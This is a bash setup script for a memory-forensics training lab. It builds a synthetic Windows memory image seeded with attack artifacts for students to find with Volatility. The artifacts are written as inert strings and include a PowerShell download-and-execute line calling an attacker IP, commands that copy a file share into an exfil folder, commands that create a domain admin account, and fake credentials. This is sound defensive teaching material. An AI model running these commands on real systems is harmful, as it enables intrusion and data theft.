#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
echo "[*] === Memory Forensics Lab Setup ==="

apt-get update -qq
apt-get install -y -qq python3 python3-pip python3-venv curl wget unzip > /dev/null 2>&1

echo "[*] Installing Volatility3 and dependencies..."
pip3 install volatility3 yara-python pefile capstone > /dev/null 2>&1

mkdir -p /opt/lab_data/forensics
ln -sf /opt/lab_data /lab-data 2>/dev/null || true
cd /opt/lab_data/forensics

echo "[*] Generating Windows 10 memory dump with attack artifacts..."
python3 << 'PYEOF'
import struct, os, random, hashlib

PATH = "/opt/lab_data/forensics/compromised-memory.raw"
SIZE = 128 * 1024 * 1024  # 128MB

random.seed(0xDEAD)

with open(PATH, "wb") as f:
    # === PAGE 0: BIOS/bootloader area ===
    f.write(b"\x00" * 0x1000)

    # === KERNEL STRUCTURES (fake EPROCESS-like blocks) ===
    # Each "process" block at known offsets with name, PID, PPID, state
    procs = [
        # (offset, name, pid, ppid, threads, create_time_epoch)
        (0x2000, b"System\x00",           4,    0,  120, 1711000000),
        (0x2200, b"smss.exe\x00",         348,  4,  2,   1711000010),
        (0x2400, b"csrss.exe\x00",        456,  348, 12, 1711000015),
        (0x2600, b"wininit.exe\x00",      508,  348, 3,  1711000016),
        (0x2800, b"services.exe\x00",     576,  508, 8,  1711000020),
        (0x2A00, b"lsass.exe\x00",        632,  508, 7,  1711000021),
        (0x2C00, b"svchost.exe\x00",      784,  576, 25, 1711000025),
        (0x2E00, b"svchost.exe\x00",      892,  576, 18, 1711000026),
        (0x3000, b"explorer.exe\x00",     2148, 2100, 35, 1711000100),
        (0x3200, b"chrome.exe\x00",       3456, 2148, 20, 1711000500),
        (0x3400, b"outlook.exe\x00",      3892, 2148, 15, 1711000600),
        # === SUSPICIOUS PROCESSES ===
        (0x3600, b"cmd.exe\x00",          4512, 3892, 1,  1711003600),  # cmd from outlook = macro
        (0x3800, b"powershell.exe\x00",   4680, 4512, 3,  1711003605),  # ps from cmd
        (0x3A00, b"updater.exe\x00",      5200, 4680, 2,  1711003650),  # dropped malware
        (0x3C00, b"svchost.exe\x00",      5444, 5200, 4,  1711003700),  # masquerading
    ]
    for off, name, pid, ppid, threads, ctime in procs:
        f.seek(off)
        f.write(name.ljust(16, b"\x00"))
        f.write(struct.pack("<III", pid, ppid, threads))
        f.write(struct.pack("<Q", ctime))

    # === NETWORK CONNECTIONS (netscan-like) ===
    net_off = 0x10000
    conns = [
        b"TCPv4  10.0.1.25:49721       93.184.216.34:443      ESTABLISHED  chrome.exe      3456",
        b"TCPv4  10.0.1.25:49832       13.107.6.152:443       ESTABLISHED  outlook.exe     3892",
        b"TCPv4  10.0.1.25:50112       185.220.101.42:443     ESTABLISHED  powershell.exe  4680",
        b"TCPv4  10.0.1.25:50244       185.220.101.42:8443    ESTABLISHED  updater.exe     5200",
        b"TCPv4  0.0.0.0:4444          0.0.0.0:0              LISTENING    svchost.exe     5444",
        b"TCPv4  10.0.1.25:50301       10.0.2.10:445          ESTABLISHED  svchost.exe     5444",
        b"TCPv4  10.0.1.25:50302       10.0.2.20:445          ESTABLISHED  svchost.exe     5444",
        b"UDPv4  10.0.1.25:53          *:*                                 svchost.exe     784",
    ]
    f.seek(net_off)
    for c in conns:
        f.write(c + b"\x00\n")

    # === COMMAND HISTORY (cmdline/consoles) ===
    cmd_off = 0x20000
    cmds = [
        b"C:\\Windows\\system32\\cmd.exe /c whoami",
        b"C:\\Windows\\system32\\cmd.exe /c ipconfig /all",
        b"C:\\Windows\\system32\\cmd.exe /c net user /domain",
        b"C:\\Windows\\system32\\cmd.exe /c net group \"Domain Admins\" /domain",
        b"C:\\Windows\\system32\\cmd.exe /c net view \\\\10.0.2.20",
        b"C:\\Windows\\system32\\cmd.exe /c dir \\\\10.0.2.20\\Sensitive$",
        b"C:\\Windows\\system32\\cmd.exe /c copy \\\\10.0.2.20\\Sensitive$\\*.* C:\\Users\\Public\\exfil\\",
        b"powershell.exe -enc aQBwAGMAbwBuAGYAaQBnACAALwBhAGwAbA==",
        b"powershell.exe -NoP -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.42:8080/stage2')\"",
        b"C:\\Users\\Public\\updater.exe --install --persist",
    ]
    f.seek(cmd_off)
    for c in cmds:
        f.write(c + b"\x00\x0A")

    # === INJECTED CODE (malfind) ===
    inject_off = 0x30000
    f.seek(inject_off)
    # Fake MZ header inside svchost memory (process hollowing indicator)
    f.write(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00")
    f.write(b"\xB8\x00\x00\x00\x00")  # mov eax, 0
    f.write(b"\x00" * 44)
    f.write(struct.pack("<I", 0x80))
    f.seek(inject_off + 0x80)
    f.write(b"PE\x00\x00\x4C\x01\x03\x00")  # PE sig + i386

    # === STRINGS / IOCs scattered through memory ===
    iocs = [
        (0x40000, b"http://185.220.101.42:8080/stage2\x00"),
        (0x40100, b"http://185.220.101.42:8443/beacon?id=WS25&v=4.8\x00"),
        (0x40200, b"https://update-service.evil-corp.com/check\x00"),
        (0x40300, b"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\x00"),
        (0x40400, b"C:\\Users\\Public\\updater.exe\x00"),
        (0x40500, b"C:\\Users\\Public\\exfil\\Q1-Revenue.xlsx\x00"),
        (0x40600, b"C:\\Users\\Public\\exfil\\Employee-SSN.csv\x00"),
        (0x40700, b"admin:P@ssw0rd123!\x00"),
        (0x40800, b"svc_backup:Backup2026!\x00"),
        (0x40900, b"Mozilla/5.0 (compatible; CobaltStrike/4.8)\x00"),
        (0x40A00, b"CreateRemoteThread\x00VirtualAllocEx\x00WriteProcessMemory\x00NtUnmapViewOfSection\x00"),
        (0x40B00, b"WS2_32.dll\x00kernel32.dll\x00ntdll.dll\x00advapi32.dll\x00"),
        (0x40C00, b"\\\\10.0.2.20\\Sensitive$\\API-Keys.txt\x00"),
        (0x40D00, b"10.0.2.10\x00DC-01.corp.local\x00"),
        (0x40E00, b"10.0.2.20\x00FS-01.corp.local\x00"),
        (0x40F00, b"net user svc_backup B@ckup2026 /add /domain\x00"),
        (0x41000, b"net group \"Domain Admins\" svc_backup /add /domain\x00"),
    ]
    for off, data in iocs:
        f.seek(off)
        f.write(data)

    # === FILL REMAINING with semi-random data (looks like real memory) ===
    f.seek(0x50000)
    remaining = SIZE - 0x50000
    chunk = 65536
    while remaining > 0:
        ws = min(chunk, remaining)
        # Mix of zeros (unmapped pages) and random data (heap/stack)
        if random.random() < 0.3:
            f.write(b"\x00" * ws)
        else:
            f.write(os.urandom(ws))
        remaining -= ws

print(f"Created {PATH} ({os.path.getsize(PATH) // (1024*1024)} MB)")
print(f"SHA256: {hashlib.sha256(open(PATH,'rb').read()).hexdigest()}")
PYEOF

cat > /opt/lab_data/forensics/README.txt << 'EOF'
=== Memory Forensics with Volatility Lab ===

Target: /opt/lab_data/forensics/compromised-memory.raw
        (also accessible at /lab-data/forensics/compromised-memory.raw)

Start here:
  cd /opt/lab_data/forensics
  vol -f compromised-memory.raw windows.info
  vol -f compromised-memory.raw windows.pslist
  vol -f compromised-memory.raw windows.pstree
  vol -f compromised-memory.raw windows.netscan
  vol -f compromised-memory.raw windows.malfind
  vol -f compromised-memory.raw windows.cmdline

Quick triage with strings:
  strings compromised-memory.raw | grep -i "http://"
  strings compromised-memory.raw | grep -iE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u
  strings compromised-memory.raw | grep -i "password\|credential"
  strings compromised-memory.raw | grep -i "HKLM\|CurrentVersion\|Run"
EOF

echo "[+] Memory forensics lab ready."
